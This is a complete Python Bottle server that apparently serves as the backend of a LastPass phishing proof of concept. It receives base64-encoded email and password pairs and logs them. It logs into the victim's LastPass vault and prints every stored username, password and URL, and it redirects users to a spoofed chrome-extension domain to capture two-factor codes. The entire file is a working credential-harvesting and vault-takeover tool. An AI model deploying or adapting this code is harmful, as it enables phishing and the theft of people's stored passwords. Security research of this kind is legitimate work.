from bottle import get, run, template, HTTPResponse, static_file, post
import base64
import urllib
import lastpass
import sys

def try_password(b64_auth, try_2fa=None):
    email, password = base64.b64decode(b64_auth).split(':', 1)
    print "Got {}:{}".format(email, password)

    try:
        vault = lastpass.Vault.open_remote(email, password, try_2fa)
        print "correct!!!"
        for i in vault.accounts:
            print(i.id, i.username, i.password, i.url)
        return HTTPResponse(status=307, headers={'Location':'http://lastpass.seancassidy.me/test.html?y'})
    except lastpass.exceptions.LastPassIncorrectGoogleAuthenticatorCodeError:
        print "Google 2FA required for {}".format(email)
        return HTTPResponse(status=307, headers={'Location':'http://chrome-extension.pw/:/debgaelkhoipmbjnhpoblmbacnmmgbeg/lp_toolstrip.html?id=' + urllib.quote(b64_auth)})
    except:
        print "incorrect :("
        return HTTPResponse(status=307, headers={'Location':'http://lastpass.seancassidy.me/test.html?n'})


@get('/p/<b64_auth>')
def basic(b64_auth):
    return try_password(b64_auth)

@post('/log/<b64_auth>')
def log_auth(b64_auth):
    email, password = base64.b64decode(b64_auth).split(':', 1)
    print "Got {}:{}".format(email, password)

@get('/2fa/<two_factor_code:int>/<b64_auth>')
def two_factor(two_factor_code, b64_auth):
    print "Got two factor code {}".format(two_factor_code)
    return try_password(b64_auth, two_factor_code)

@get('/:/<chrome_id>/<filepath:path>')
@get('/://<chrome_id>/<filepath:path>')
def server_static(chrome_id, filepath):
    return static_file(filepath, root='.')

if len(sys.argv) > 1:
    if len(sys.argv) > 2:
        run(host=sys.argv[1], port=sys.argv[2])
    else:
        run(host=sys.argv[1], port=80)
else:
    run(host='0.0.0.0', port=80)
